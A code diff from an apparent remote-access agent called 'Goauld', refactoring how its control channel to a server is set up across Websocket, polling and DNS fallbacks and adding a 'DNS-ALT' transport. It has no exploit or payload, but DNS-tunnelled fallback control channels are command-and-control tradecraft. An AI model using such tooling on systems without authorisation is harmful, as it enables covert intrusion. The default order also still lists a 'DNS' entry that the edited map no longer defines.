@@ -4,7 +4,6 @@ import (
 	"Goauld/agent/config"
 	globalcontext "Goauld/agent/context"
 	"Goauld/agent/control"
-	"Goauld/agent/ssh/transport"
 	"Goauld/common/log"
 	"context"
 	"os"
@@ -12,16 +11,14 @@ import (
 	"time"
 )
 
-func InitControl(ctx context.Context, dnsTransport *transport.DNSSH, globalCanceler *globalcontext.GlobalCanceler, configDone chan string, controlErr chan error) (bool, *control.ControlPlanClient) {
-	// Define the different strategies to initialize the control socket
-	//  Currently, all strategies are tried in order.
-	socketOrder := []string{
+var (
+	socketOrder = []string{
 		"Websocket",
 		"Upgrade",
 		"Polling",
 		"DNS",
 	}
-	controlInitStrategy := map[string]control.InitStrategy{
+	controlInitStrategy = map[string]control.InitStrategy{
 		"Websocket": {
 			Name: "Websocket",
 			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
@@ -40,29 +37,18 @@ func InitControl(ctx context.Context, dnsTransport *transport.DNSSH, globalCance
 				return client.InitPolling(success, chanErr)
 			},
 		},
-		"DNS": {
-			Name: "DNS",
+		"DNS-ALT": {
+			Name: "DNS-ALT",
 			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
-				if !dnsTransport.Started {
-					err := dnsTransport.Start()
-					if err != nil {
-						return err
-					}
-				}
-
-				err := client.InitOverDNS(dnsTransport.ControlStream, success, chanErr)
-				if err != nil {
-					return err
-				}
-
-				// As the  control socket is established using DNS we consider that the only working protocol is DNS
-				// so we set the RSSH protocol order to only DNS
-				config.Get().SetRSSHOrder([]string{"DNS"})
-
-				return nil
+				return client.InitControlOverDNSAlt(success, chanErr)
 			},
 		},
 	}
+)
+
+func InitControl(ctx context.Context, globalCanceler *globalcontext.GlobalCanceler, configDone chan string, controlErr chan error) (bool, *control.ControlPlanClient) {
+	// Define the different strategies to initialize the control socket
+	//  Currently, all strategies are tried in order.
 
 	if config.Get().UseRelay() {
 		config.Get().SetRSSHOrder([]string{"ws"})
@@ -74,6 +60,9 @@ func InitControl(ctx context.Context, dnsTransport *transport.DNSSH, globalCance
 	if len(order) == 1 {
 		if order[0] == "dns" {
 			socketOrder = []string{"DNS"}
+		}
+		if order[0] == "dns-alt" {
+			socketOrder = []string{"DNS-ALT"}
 		}
 		if order[0] == "http" {
 			socketOrder = []string{"Polling"}
